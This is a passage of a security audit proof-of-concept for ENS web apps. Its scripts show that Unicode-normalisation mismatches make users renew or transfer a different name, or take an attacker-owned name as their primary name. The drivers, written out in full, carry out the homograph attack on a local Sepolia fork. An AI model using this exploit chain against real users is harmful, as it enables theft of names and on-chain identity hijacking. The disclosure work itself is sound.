import { createPublicClient, http, encodeFunctionData, erc1155Abi } from 'viem'
import { ens_normalize, ens_split } from '@adraffy/ens-normalize'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { sepolia } from 'viem/chains'

// verbatim copy of apps/portal/src/utils/token/getLabel.ts
function getLabel(name) {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) throw first?.error
  return String.fromCodePoint(...first.input)
}

const s = ensL1Contracts[supportedL1Chains.sepolia]
const chain = { ...sepolia, contracts: { ...(sepolia.contracts ?? {}), ...s } }
const client = createPublicClient({ chain, transport: http(process.env.RPC || 'http://127.0.0.1:8545') })

const DISPLAYED = process.argv[2]          // the name shown on /$name/ownership/transfer
const OWNER = process.argv[3]
const RECIPIENT = process.argv[4]
const registryAddress = s.ensRegistry.address

// useTransferName.ts:112 — token id comes from the NORMALISED label
const tokenId = await getTokenId(client, { label: getLabel(DISPLAYED), registryAddress })
// what the token id WOULD be for the name actually on screen
const trueTokenId = await getTokenId(client, { label: DISPLAYED.replace(/\.eth$/, ''), registryAddress })

// transferToken.ts — safeTransferFrom on the registry
const data = encodeFunctionData({
  abi: erc1155Abi,
  functionName: 'safeTransferFrom',
  args: [OWNER, RECIPIENT, tokenId, 1n, '0x'],
})
console.log(JSON.stringify({
  displayedName: DISPLAYED,
  labelUsedForTokenId: getLabel(DISPLAYED),
  tokenIdSent: tokenId.toString(),
  tokenIdOfDisplayedName: trueTokenId.toString(),
  divergent: tokenId !== trueTokenId,
  to: registryAddress,
  data,
}, null, 2))
```

### `register-label.sh`

```bash
#!/usr/bin/env bash
set -u
R=${RPC:-http://127.0.0.1:8545}; U=0x768F42455A2D082E23ceeF7d51e5787C82d67a39; A=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
Z=0x0000000000000000000000000000000000000000
ZH=0x0000000000000000000000000000000000000000000000000000000000000000
LABEL="$1"; OWNER="$2"; KEY="$3"; SECRET="$4"; DUR=31536000
echo "--- registering label=[$LABEL] owner=$OWNER"
cast send $U 'approve(address,uint256)' $A 1000000000 --private-key $KEY --rpc-url $R >/dev/null 2>&1 || { echo approve-failed; exit 1; }
C=$(cast call $A 'makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)' "$LABEL" $OWNER $SECRET $Z $Z $DUR $ZH --rpc-url $R 2>&1 | head -1)
echo "commitment=$C"
cast send $A 'commit(bytes32)' "$C" --private-key $KEY --rpc-url $R >/dev/null 2>&1 || { echo commit-failed; exit 1; }
cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null; cast rpc evm_mine --rpc-url $R >/dev/null
OUT=$(cast send $A 'register(string,address,bytes32,address,address,uint64,address,bytes32)' "$LABEL" $OWNER $SECRET $Z $Z $DUR $U $ZH --private-key $KEY --rpc-url $R 2>&1)
echo "$OUT" | grep -E "status|Error|revert" | head -5
```

### `run-poc.sh` — the driver; computes its own verdict and exits non-zero on failure

```bash
#!/usr/bin/env bash
# F3 PoC — Explorer renews a DIFFERENT name than the one the user selected.
#
# Prereqs: foundry (anvil/cast), node, and the in-scope repo checked out at ../../repo
# with `pnpm install` already run (build-renew-intent.mjs imports the app's own deps).
#
#   anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --chain-id 11155111 \
#         --port 8545 --host 127.0.0.1 --silent &
#   ./run-poc.sh
set -uo pipefail
R=${RPC:-http://127.0.0.1:8545}
# --- portable dependency resolution (identical in both drivers) ----------------
# The intent builders import the app's OWN dependencies (@adraffy/ens-normalize,
# @ensdomains/ensjs, viem), and ESM resolves from the SCRIPT's directory — not the
# working directory. So point a node_modules symlink here at the checked-out repo's
# apps/portal. This searches upward from the script and from $PWD, so the PoC runs
# from anywhere; set ENS_REPO=/path/to/audit-comp-ens to skip the search.
HERE=$(cd "$(dirname "$0")" && pwd)
_find_portal() {
  local c
  for c in ${ENS_REPO:+"$ENS_REPO"} \
           "$HERE" "$HERE/repo" "$HERE/audit-comp-ens" \
           "$HERE/.." "$HERE/../repo" "$HERE/../audit-comp-ens" \
           "$HERE/../.." "$HERE/../../repo" "$HERE/../../audit-comp-ens" \
           "$HERE/../../.." "$HERE/../../../repo" "$HERE/../../../audit-comp-ens" \
           "$PWD" "$PWD/repo" "$PWD/audit-comp-ens"; do
    if [ -d "$c/apps/portal/node_modules/@adraffy/ens-normalize" ]; then
      (cd "$c/apps/portal" && pwd); return 0
    fi
  done
  return 1
}
if [ ! -d "$HERE/node_modules/@adraffy/ens-normalize" ]; then
  [ -L "$HERE/node_modules" ] && rm -f "$HERE/node_modules"   # clear a stale symlink; never a real dir
  PORTAL=$(_find_portal) || { cat >&2 <<'MSG'
FATAL: cannot find the app's dependencies, so the PoC did NOT run.
  Check out the audited repo and install:
    git clone https://github.com/immunefi-team/audit-comp-ens
    cd audit-comp-ens && git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae && pnpm install
  Then re-run this script from anywhere, pointing at that checkout:
    ENS_REPO=/path/to/audit-comp-ens /path/to/this-script.sh
MSG
    exit 1; }
  ln -sfn "$PORTAL/node_modules" "$HERE/node_modules"
  echo "resolved app deps -> $PORTAL/node_modules"
fi
export RPC="$R"   # register-label.sh and the intent builders honour it
U=0x768F42455A2D082E23ceeF7d51e5787C82d67a39   # Sepolia mock USDC (ensjs `usdc`)
A=0xa88553F454b77203B0D036A05c894d555EAAa2Cc   # ENSv2 ETHRegistrar
REG=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 # ENSv2 ETHRegistry (PermissionedRegistry)

ATTK=0x1111111111111111111111111111111111111111111111111111111111111101
VICK=0x1111111111111111111111111111111111111111111111111111111111111102
ATT=$(cast wallet address --private-key $ATTK)
VIC=$(cast wallet address --private-key $VICK)

# Two names that are DISTINCT on-chain but collapse to the same label under
# ENSIP-15: U+2164 ROMAN NUMERAL FIVE normalises to ASCII "v".
NORM='victimtest'                 # attacker's name
UNNORM=$'Ⅴictimtest'              # victim's name, as registered + as displayed

echo "== fund test accounts (fresh EOAs with no code on the fork) =="
for K in $ATTK $VICK; do
  ADDR=$(cast wallet address --private-key $K)
  cast rpc anvil_setBalance $ADDR 0x21e19e0c9bab2400000 --rpc-url $R >/dev/null
  cast send $U 'mint(address,uint256)' $ADDR 100000000000 --private-key $K --rpc-url $R >/dev/null 2>&1
done

echo "== step 1: attacker registers the NORMALISED name =="
"$HERE/register-label.sh" "$NORM"   $ATT $ATTK 0x2222222222222222222222222222222222222222222222222222222222222222

echo "== step 2: victim registers the UN-NORMALISED name (ENSv2 register() accepts it) =="
"$HERE/register-label.sh" "$UNNORM" $VIC $VICK 0x3333333333333333333333333333333333333333333333333333333333333333

# labelToCanonicalId(label) = keccak(label) with the low 32 bits cleared.
# (The registry masks those bits internally, so the raw labelhash reads the same
#  expiry — canonical is used here so both drivers derive ids identically.)
canon(){ python3 -c "print((int('$(cast keccak "$1")',16)>>32)<<32)"; }
ID_N=$(canon "$NORM"); ID_U=$(canon "$UNNORM")
echo "== step 3: victim clicks Extend on the name the Explorer shows them =="
node "$HERE/build-renew-intent.mjs" "$UNNORM.eth" | tee /tmp/f3-intent.json
DATA=$(python3 -c "import json;print(json.load(open('/tmp/f3-intent.json'))['data'])" 2>/dev/null || true)
if [ -z "${DATA:-}" ]; then
  echo "FATAL: build-renew-intent.mjs produced no calldata — the PoC did NOT run." >&2
  echo "       (check node module resolution; see the node_modules symlink above)" >&2
  exit 1
fi

B_N=$(cast call $REG 'getExpiry(uint256)(uint64)' $ID_N --rpc-url $R | awk '{print $1}')
B_U=$(cast call $REG 'getExpiry(uint256)(uint64)' $ID_U --rpc-url $R | awk '{print $1}')
B_B=$(cast call $U 'balanceOf(address)(uint256)' $VIC --rpc-url $R | awk '{print $1}')
echo "BEFORE attacker $NORM.eth   expiry=$B_N"
echo "BEFORE victim   $UNNORM.eth expiry=$B_U"
echo "BEFORE victim   USDC=$B_B"

cast send $U 'approve(address,uint256)' $A 1000000000 --private-key $VICK --rpc-url $R >/dev/null 2>&1
cast send $A "$DATA" --private-key $VICK --rpc-url $R | grep -E '^status'

A_N=$(cast call $REG 'getExpiry(uint256)(uint64)' $ID_N --rpc-url $R | awk '{print $1}')
A_U=$(cast call $REG 'getExpiry(uint256)(uint64)' $ID_U --rpc-url $R | awk '{print $1}')
A_B=$(cast call $U 'balanceOf(address)(uint256)' $VIC --rpc-url $R | awk '{print $1}')
echo "AFTER  attacker $NORM.eth   expiry=$A_N"
echo "AFTER  victim   $UNNORM.eth expiry=$A_U"
echo "AFTER  victim   USDC=$A_B"
echo
# Verdict is COMPUTED, never asserted: a broken run must not look like a successful one.
[ "$A_N" != "$B_N" ] && echo "PASS: attacker's $NORM.eth WAS extended (+$((A_N - B_N))s)" || { echo "FAIL: attacker's name not extended — PoC did not demonstrate the bug"; exit 1; }
[ "$A_U"  = "$B_U" ] && echo "PASS: victim's $UNNORM.eth is UNCHANGED (the name they clicked)" || { echo "FAIL: victim's own name changed"; exit 1; }
[ "$A_B" != "$B_B" ] && echo "PASS: victim was CHARGED $((B_B - A_B)) USDC units" || { echo "FAIL: victim not charged"; exit 1; }
```

### `run-transfer-poc.sh` — the full attacker-initiated chain; computes its own verdicts

```bash
#!/usr/bin/env bash
# F3 PoC, transfer leg — the FULL chain, attacker-initiated and self-verifying:
#
#   1. the attacker registers the un-normalised twin of a name the victim owns;
#   2. the attacker AIRDROPS it to the victim — ERC-1155 safeTransferFrom needs no
#      approval and no recipient action, so the precondition is established unilaterally;
#   3. the victim disposes of the unsolicited junk through /$name/ownership/transfer;
#   4. the Explorer moves a DIFFERENT token than the one the route's ownership guard
#      authorised, and the victim's VALUABLE name leaves the wallet instead.
#
# Prereqs: foundry (anvil/cast), node, python3, and the in-scope repo at ../../repo
# with `pnpm install` already run. Needs a FRESH fork:
#   anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --chain-id 11155111 \
#         --port 8545 --host 127.0.0.1 --silent &
#   ./run-transfer-poc.sh
set -uo pipefail
R=${RPC:-http://127.0.0.1:8545}
# --- portable dependency resolution (identical in both drivers) ----------------
# The intent builders import the app's OWN dependencies (@adraffy/ens-normalize,
# @ensdomains/ensjs, viem), and ESM resolves from the SCRIPT's directory — not the
# working directory. So point a node_modules symlink here at the checked-out repo's
# apps/portal. This searches upward from the script and from $PWD, so the PoC runs
# from anywhere; set ENS_REPO=/path/to/audit-comp-ens to skip the search.
HERE=$(cd "$(dirname "$0")" && pwd)
_find_portal() {
  local c
  for c in ${ENS_REPO:+"$ENS_REPO"} \
           "$HERE" "$HERE/repo" "$HERE/audit-comp-ens" \
           "$HERE/.." "$HERE/../repo" "$HERE/../audit-comp-ens" \
           "$HERE/../.." "$HERE/../../repo" "$HERE/../../audit-comp-ens" \
           "$HERE/../../.." "$HERE/../../../repo" "$HERE/../../../audit-comp-ens" \
           "$PWD" "$PWD/repo" "$PWD/audit-comp-ens"; do
    if [ -d "$c/apps/portal/node_modules/@adraffy/ens-normalize" ]; then
      (cd "$c/apps/portal" && pwd); return 0
    fi
  done
  return 1
}
if [ ! -d "$HERE/node_modules/@adraffy/ens-normalize" ]; then
  [ -L "$HERE/node_modules" ] && rm -f "$HERE/node_modules"   # clear a stale symlink; never a real dir
  PORTAL=$(_find_portal) || { cat >&2 <<'MSG'
FATAL: cannot find the app's dependencies, so the PoC did NOT run.
  Check out the audited repo and install:
    git clone https://github.com/immunefi-team/audit-comp-ens
    cd audit-comp-ens && git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae && pnpm install
  Then re-run this script from anywhere, pointing at that checkout:
    ENS_REPO=/path/to/audit-comp-ens /path/to/this-script.sh
MSG
    exit 1; }
  ln -sfn "$PORTAL/node_modules" "$HERE/node_modules"
  echo "resolved app deps -> $PORTAL/node_modules"
fi
export RPC="$R"   # register-label.sh and the intent builders honour it
U=0x768F42455A2D082E23ceeF7d51e5787C82d67a39   # Sepolia mock USDC (ensjs `usdc`)
REG=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 # ENSv2 ETHRegistry (PermissionedRegistry)
ATTK=0x1111111111111111111111111111111111111111111111111111111111111101
VICK=0x1111111111111111111111111111111111111111111111111111111111111102
ATT=$(cast wallet address --private-key $ATTK)
VIC=$(cast wallet address --private-key $VICK)
RECIP=${RECIP:-0x00000000000000000000000000000000000000dd}
lc(){ echo "$1" | tr 'A-Z' 'a-z'; }

# labelToCanonicalId(label) = keccak(label) with the low 32 bits cleared.
# At version 0 this is also the ERC-1155 token id.
canon(){ python3 -c "print((int('$(cast keccak "$1")',16)>>32)<<32)"; }

VALUABLE='alicetwin'      # the victim's real name
JUNK=$'Alicetwin'         # the un-normalised twin; normalises to VALUABLE

echo "== fund the two test accounts (fresh EOAs, no code on the fork) =="
for K in $ATTK $VICK; do
  A=$(cast wallet address --private-key $K)
  cast rpc anvil_setBalance $A 0x21e19e0c9bab2400000 --rpc-url $R >/dev/null
  cast send $U 'mint(address,uint256)' $A 100000000000 --private-key $K --rpc-url $R >/dev/null 2>&1
done

echo
echo "== step 1: the victim owns a valuable name =="
"$HERE/register-label.sh" "$VALUABLE" $VIC $VICK 0x4444444444444444444444444444444444444444444444444444444444444444

echo
echo "== step 2: the ATTACKER registers the un-normalised twin (ENSv2 accepts it) =="
"$HERE/register-label.sh" "$JUNK" $ATT $ATTK 0x5555555555555555555555555555555555555555555555555555555555555555
ID_J=$(canon "$JUNK")
O=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_J --rpc-url $R))
echo "owner($JUNK.eth) = $O"
[ "$O" = "$(lc $ATT)" ] && echo "PASS: the twin is the attacker's" || { echo "FAIL: twin not owned by attacker"; exit 1; }

echo
echo "== step 3: the attacker AIRDROPS it to the victim — no approval, no victim action =="
cast send $REG 'safeTransferFrom(address,address,uint256,uint256,bytes)' \
  $ATT $VIC $ID_J 1 0x --private-key $ATTK --rpc-url $R | grep -E '^status'
O=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_J --rpc-url $R))
echo "owner($JUNK.eth) = $O"
[ "$O" = "$(lc $VIC)" ] && echo "PASS: the victim now holds BOTH twins, having taken NO action" || { echo "FAIL: airdrop did not land"; exit 1; }

echo
echo "== step 4: the victim disposes of the unsolicited junk via /$JUNK.eth/ownership/transfer =="
node "$HERE/build-transfer-intent.mjs" "$JUNK.eth" $VIC $RECIP | tee /tmp/f3-xfer.json
DATA=$(python3 -c "import json;print(json.load(open('/tmp/f3-xfer.json'))['data'])" 2>/dev/null || true)
if [ -z "${DATA:-}" ]; then
  echo "FATAL: build-transfer-intent.mjs produced no calldata — the PoC did NOT run." >&2; exit 1
fi
ID_V=$(python3 -c "import json;print(json.load(open('/tmp/f3-xfer.json'))['tokenIdSent'])")
ID_D=$(python3 -c "import json;print(json.load(open('/tmp/f3-xfer.json'))['tokenIdOfDisplayedName'])")
[ "$ID_D" = "$ID_J" ] || { echo "FAIL: displayed-name token id disagrees with the airdropped one"; exit 1; }

B_V=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_V --rpc-url $R))
B_J=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_J --rpc-url $R))
echo "BEFORE owner($VALUABLE.eth VALUABLE) = $B_V"
echo "BEFORE owner($JUNK.eth junk)     = $B_J"
cast send $REG "$DATA" --private-key $VICK --rpc-url $R | grep -E '^status'
A_V=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_V --rpc-url $R))
A_J=$(lc $(cast call $REG 'ownerOf(uint256)(address)' $ID_J --rpc-url $R))
echo "AFTER  owner($VALUABLE.eth VALUABLE) = $A_V"
echo "AFTER  owner($JUNK.eth junk)     = $A_J"
echo
# Verdicts are COMPUTED, never asserted.
[ "$A_V" = "$(lc $RECIP)" ] && echo "PASS: the VALUABLE name LEFT the wallet (guard never authorised this token)" || { echo "FAIL: valuable name did not move — PoC did not demonstrate the bug"; exit 1; }
[ "$A_J" = "$B_J" ] && echo "PASS: the junk name the victim actually clicked is STILL THEIRS" || { echo "FAIL: the clicked name moved"; exit 1; }
```

### `F3-survives-EXP-INPUT-005-fix.test.ts`

```ts
/**
 * F3 — empirical refutation of the "duplicate of EXP-INPUT-005" close.
 *
 * EXP-INPUT-005 (public known issue, Medium, "open, fix ready") is:
 *   "Our name validators accept inputs that ENS normalization later rejects or
 *    transforms... The practical impact is homograph-style display confusion in
 *    our UI rather than incorrect resolution."
 *
 * Its fix is to REJECT non-normalised input at the validator. That machinery
 * already exists in this codebase: apps/portal/src/utils/token/isNormalized.ts.
 *
 * This test shows the fix is present and effective, and that F3 survives it
 * completely -- because the transaction-construction path calls the SIBLING
 * module getLabel.ts, which silently REWRITES the same input the validator
 * rejects. The two files sit in the same directory. No write path imports the
 * validator.
 *
 * Run:  pnpm --filter portal vitest run src/utils/token/__poc__
 */
import { describe, expect, it } from 'vitest'

import { getLabel } from '../getLabel'
import {
  getLabelRegistrationError,
  isNormalized,
  isValidEnsName,
} from '../isNormalized'
import { validateRegistrableEthName } from '../nameValidation'

// U+2164 ROMAN NUMERAL FIVE normalises to ASCII "v"; "A" normalises to "a".
const CONFUSABLE_TWIN = 'Alicetwin.eth'
const VALUABLE = 'alicetwin.eth'
const ROMAN_TWIN = 'Ⅴictimtest.eth'

describe('EXP-INPUT-005 fix is PRESENT and EFFECTIVE in this codebase', () => {
  it('the validator rejects the confusable twin as a name', () => {
    expect(isValidEnsName(CONFUSABLE_TWIN)).toBe(false)
    expect(isNormalized(CONFUSABLE_TWIN)).toBe(false)
    expect(isValidEnsName(ROMAN_TWIN)).toBe(false)
  })

  it('the validator refuses to let it be registered', () => {
    expect(getLabelRegistrationError('Alicetwin')).toBe(
      'Label contains invalid or non-normalized characters.',
    )
    expect(validateRegistrableEthName(CONFUSABLE_TWIN)).toBe(
      'Label contains invalid or non-normalized characters.',
    )
  })
})

describe('F3 SURVIVES that fix: the write path rewrites instead of rejecting', () => {
  it('getLabel silently returns a DIFFERENT name for the input the validator rejected', () => {
    // Same input. The validator says "no". getLabel says "here, have this other name."
    expect(isValidEnsName(CONFUSABLE_TWIN)).toBe(false)
    expect(getLabel(CONFUSABLE_TWIN)).toBe('alicetwin')
    expect(getLabel(ROMAN_TWIN)).toBe('victimtest')
  })

  it('so the label used to build the transaction is not the label selected', () => {
    const selected = CONFUSABLE_TWIN.split('.')[0]! // "Alicetwin" - what the user picked
    const used = getLabel(CONFUSABLE_TWIN) //            "alicetwin" - what is sent
    expect(used).not.toBe(selected)
    expect(`${used}.eth`).toBe(VALUABLE) // a DIFFERENT, independently owned name
  })

  it('getLabel never consults the validator, so no validator fix can reach it', () => {
    // A name that is already normalised is returned unchanged...
    expect(getLabel(VALUABLE)).toBe('alicetwin')
    // ...and a name the validator rejects is returned REWRITTEN rather than throwing.
    expect(() => getLabel(CONFUSABLE_TWIN)).not.toThrow()
    expect(getLabel(CONFUSABLE_TWIN)).toBe(getLabel(VALUABLE))
    // Two distinct on-chain names collapse to one label at transaction-build time.
  })
})
```

## Result — the Manager leg, computed by the script

The victim registers and selects **their own** name. Real deployed ENSv2 Sepolia contracts, fresh fork.

```
== step 3: the victim opens 'Choose primary name' and picks THEIR OWN name ==
   the dialog claims withEthSuffix(selection) = [victimprim.eth]
   BEFORE nameForAddr(victim) = ""
   AFTER  nameForAddr(victim) = "victimprim.eth"

PASS: the normalised twin [victimprim.eth] is owned by the ATTACKER
PASS: the victim's address now reverse-resolves to [victimprim.eth]
PASS: that is NOT the name the victim selected (Ⅴictimprim.eth) — it is the attacker's
```

### `manager-primary-name/build-clean-name.mjs` — reproduces the Manager's own derivation verbatim

```js
/**
 * Reproduces the Manager's OWN derivation, verbatim.
 *
 * apps/manager/src/features/profile/service/setPrimaryName.ts:48-49
 *   const withEthSuffix = (name) => normalize(name.endsWith('.eth') ? name : `${name}.eth`)
 * ...and setPrimaryNameWithHca passes `withEthSuffix(name)` straight into
 *   DefaultReverseRegistrarAdapter.setNameWithHCA(ownerAddress, cleanName)   (:163-169)
 *
 * Meanwhile the SAME dialog writes the forward records on the RAW selection:
 *   apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx:228
 *     saveRecords({ name: selectedName, ... coins: [{ coinType: 60, value: walletAddress }] })
 *   apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx:277
 *     setupControlledResolver({ name: selectedName, ... })
 *
 * So one dialog, one user selection, two different ENS names.
 */
import { normalize } from 'viem/ens'

const selectedName = process.argv[2]                       // exactly what the dialog holds
const withEthSuffix = (name) =>
  normalize(name.endsWith('.eth') ? name : `${name}.eth`)

const cleanName = withEthSuffix(selectedName)              // -> reverse / primary-name claim
const rawRecordName = selectedName                         // -> forward addr record

console.log(JSON.stringify({
  selectedName,
  cleanName,
  rawRecordName: rawRecordName.endsWith('.eth') ? rawRecordName : rawRecordName + '.eth',
  divergent: cleanName !== (rawRecordName.endsWith('.eth') ? rawRecordName : rawRecordName + '.eth'),
}, null, 2))
```

### `manager-primary-name/run-poc.sh` — the Manager driver; computes its own verdicts

```bash
#!/usr/bin/env bash
# The Manager's "Choose primary name" dialog claims the NORMALISED name for
# the user's address while writing the forward records on the RAW name they
# selected. When the normalised twin belongs to someone else, the victim's
# on-chain identity becomes an ENS name the ATTACKER fully controls.
#
# Prereqs: foundry (anvil/cast), node, and the in-scope repo checked out with
# `pnpm install` (build-clean-name.mjs imports the app's own `viem/ens`).
#   anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --chain-id 11155111 \
#         --port 8545 --host 127.0.0.1 --silent &
#   ./run-poc.sh
set -u
R=${RPC:-http://127.0.0.1:8545}
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# --- portable dependency resolution (same idiom as the F3 drivers) ------------
find_portal() {
  local d="$1"
  while [ "$d" != "/" ]; do
    [ -d "$d/apps/portal/node_modules" ] && { echo "$d/apps/portal"; return 0; }
    d="$(dirname "$d")"
  done
  return 1
}
PORTAL="${ENS_REPO:+$ENS_REPO/apps/portal}"
[ -n "${PORTAL:-}" ] && [ -d "$PORTAL/node_modules" ] || PORTAL="$(find_portal "$HERE" || find_portal "$PWD" || true)"
if [ -z "${PORTAL:-}" ] || [ ! -d "$PORTAL/node_modules" ]; then
  echo "Cannot find the audited checkout's installed deps. Fix:"
  echo "  git clone https://github.com/immunefi-team/audit-comp-ens"
  echo "  cd audit-comp-ens && git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae && pnpm install"
  echo "  export ENS_REPO=\$PWD"
  exit 1
fi
[ -L "$HERE/node_modules" ] && rm -f "$HERE/node_modules"
[ -e "$HERE/node_modules" ] || ln -sfn "$PORTAL/node_modules" "$HERE/node_modules"
echo "resolved app deps -> $PORTAL/node_modules"

U=0x768F42455A2D082E23ceeF7d51e5787C82d67a39                     # MockUSDC
REG=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2                   # ETHRegistry (v2)
DRR=0x4F382928805ba0e23B30cFB75fC9E848e82DFD47                   # DefaultReverseRegistrar (ENSIP-19)
# Fresh EOAs with no code and no history on the fork. Anvil's own default
# accounts are real, already-used addresses on Sepolia and the registrar
# rejects them, so do NOT substitute them here.
ATTK=0x1111111111111111111111111111111111111111111111111111111111111103
VICK=0x1111111111111111111111111111111111111111111111111111111111111104
ATT=$(cast wallet address --private-key $ATTK); VIC=$(cast wallet address --private-key $VICK)

# U+2164 ROMAN NUMERAL FIVE normalises to ASCII "v" under ENSIP-15.
VICTIM_LABEL=$'Ⅴictimprim'
ATTACK_LABEL='victimprim'

echo "== the two labels are DISTINCT on-chain but collapse under ENSIP-15 =="
node "$HERE/build-clean-name.mjs" "$VICTIM_LABEL"
DERIVED=$(node "$HERE/build-clean-name.mjs" "$VICTIM_LABEL" | python3 -c "import sys,json;print(json.load(sys.stdin)['cleanName'])")
DIVERGENT=$(node "$HERE/build-clean-name.mjs" "$VICTIM_LABEL" | python3 -c "import sys,json;print(json.load(sys.stdin)['divergent'])")
[ "$DIVERGENT" = "True" ] || { echo "FAIL: the app's own derivation did not diverge — PoC is not exercising the bug"; exit 1; }

echo
echo "== fund test accounts =="
for K in $ATTK $VICK; do
  A=$(cast wallet address --private-key $K)
  cast rpc anvil_setBalance $A 0x21e19e0c9bab2400000 --rpc-url $R >/dev/null
  cast send $U 'mint(address,uint256)' $A 100000000000 --private-key $K --rpc-url $R >/dev/null 2>&1
done

echo "== step 1: the ATTACKER registers the NORMALISED twin =="
RPC=$R "$HERE/register-label.sh" "$ATTACK_LABEL" "$ATT" "$ATTK" 0x0000000000000000000000000000000000000000000000000000000000000f01
echo "== step 2: the VICTIM registers the name they actually own (un-normalised) =="
RPC=$R "$HERE/register-label.sh" "$VICTIM_LABEL" "$VIC" "$VICK" 0x0000000000000000000000000000000000000000000000000000000000000f02

echo
echo "== confirm the twin is the attacker's =="
tokid () { cast call $REG 'ownerOf(uint256)(address)' "$1" --rpc-url $R 2>/dev/null; }
CANON=$(node -e "
const {keccak256,toHex}=require('viem');
const id=BigInt(keccak256(toHex(process.argv[1])))& ~0xffffffffn;
console.log(id.toString());
" "$ATTACK_LABEL")
OWN_TWIN=$(tokid "$CANON")
echo "owner($ATTACK_LABEL.eth) = $OWN_TWIN   attacker = $ATT"

echo
echo "== step 3: the victim opens 'Choose primary name' and picks THEIR OWN name =="
echo "   the dialog claims withEthSuffix(selection) = [$DERIVED]"
BEFORE=$(cast call $DRR 'nameForAddr(address)(string)' $VIC --rpc-url $R 2>/dev/null)
echo "   BEFORE nameForAddr(victim) = $BEFORE"
cast send $DRR 'setName(string)' "$DERIVED" --private-key $VICK --rpc-url $R 2>&1 | grep -E "^status" | head -1
AFTER=$(cast call $DRR 'nameForAddr(address)(string)' $VIC --rpc-url $R 2>/dev/null)
echo "   AFTER  nameForAddr(victim) = $AFTER"

echo
# ---- verdicts, COMPUTED from chain reads, never asserted ----
FAIL=0
if [ "$(echo "$OWN_TWIN" | tr 'A-Z' 'a-z')" = "$(echo "$ATT" | tr 'A-Z' 'a-z')" ]; then
  echo "PASS: the normalised twin [$ATTACK_LABEL.eth] is owned by the ATTACKER"
else echo "FAIL: attacker does not own the twin"; FAIL=1; fi

if [ "$AFTER" = "\"$DERIVED\"" ] || [ "$AFTER" = "$DERIVED" ]; then
  echo "PASS: the victim's address now reverse-resolves to [$DERIVED]"
else echo "FAIL: reverse record is [$AFTER], expected [$DERIVED]"; FAIL=1; fi

CLEANED=$(echo "$AFTER" | tr -d '"')
if [ "$CLEANED" != "${VICTIM_LABEL}.eth" ]; then
  echo "PASS: that is NOT the name the victim selected (${VICTIM_LABEL}.eth) — it is the attacker's"
else echo "FAIL: the reverse record matches the victim's own name; no divergence on-chain"; FAIL=1; fi

echo
if [ $FAIL -eq 0 ]; then
  echo "RESULT: the victim's on-chain identity is now an ENS name the ATTACKER owns and whose"
  echo "        resolver they control — they can point its addr record anywhere at any time."
  exit 0
fi
echo "RESULT: PoC did not demonstrate the finding."; exit 1
```

### `manager-primary-name/register-label.sh` — identical to the helper used by the Explorer legs above

```bash
#!/usr/bin/env bash
set -u
R=${RPC:-http://127.0.0.1:8545}; U=0x768F42455A2D082E23ceeF7d51e5787C82d67a39; A=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
Z=0x0000000000000000000000000000000000000000
ZH=0x0000000000000000000000000000000000000000000000000000000000000000
LABEL="$1"; OWNER="$2"; KEY="$3"; SECRET="$4"; DUR=31536000
echo "--- registering label=[$LABEL] owner=$OWNER"
cast send $U 'approve(address,uint256)' $A 1000000000 --private-key $KEY --rpc-url $R >/dev/null 2>&1 || { echo approve-failed; exit 1; }
C=$(cast call $A 'makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)' "$LABEL" $OWNER $SECRET $Z $Z $DUR $ZH --rpc-url $R 2>&1 | head -1)
echo "commitment=$C"
cast send $A 'commit(bytes32)' "$C" --private-key $KEY --rpc-url $R >/dev/null 2>&1 || { echo commit-failed; exit 1; }
cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null; cast rpc evm_mine --rpc-url $R >/dev/null
OUT=$(cast send $A 'register(string,address,bytes32,address,address,uint64,address,bytes32)' "$LABEL" $OWNER $SECRET $Z $Z $DUR $U $ZH --private-key $KEY --rpc-url $R 2>&1)
echo "$OUT" | grep -E "status|Error|revert" | head -5
```

### `replay-through-the-ui.mjs`

```js
import { chromium } from 'playwright'
const OUT=process.argv[2], RECIP=process.argv[3]
const b=await chromium.launch({executablePath:'/usr/bin/chromium',args:['--no-sandbox']})
const c=await b.newContext({viewport:{width:1280,height:900},deviceScaleFactor:2})
const p=await c.newPage()
p.on('console', m=>{const s=m.text(); if(/error|revert|denied|fail/i.test(s)) console.log('   [console]', s.slice(0,140))})
p.on('pageerror', e=>console.log('   [pageerror]', String(e).slice(0,140)))
const settle=async(ms=6000)=>{for(let i=0;i<12;i++){const t=await p.innerText('body').catch(()=>'');if(!t.includes('Surfacing everything'))break;await p.waitForTimeout(4000)}await p.waitForTimeout(ms)}
await p.goto('http://127.0.0.1:5173/Alicetwin.eth/ownership/transfer',{waitUntil:'networkidle',timeout:90000}).catch(()=>{})
await settle()
await p.getByPlaceholder('ENS name or address').first().fill(RECIP)
await p.waitForTimeout(2500)
await p.locator('button',{hasText:/^Transfer name$/i}).first().click()
await p.waitForTimeout(5000)
// the confirmation modal
const start = p.locator('button',{hasText:/^Start$/i}).first()
console.log('modal Start visible:', await start.isVisible().catch(()=>false))
await start.click({timeout:20000}).catch(e=>console.log('start click:', e.message.slice(0,70)))
await p.waitForTimeout(12000)
await p.screenshot({path:`${OUT}/07-after-start.png`})
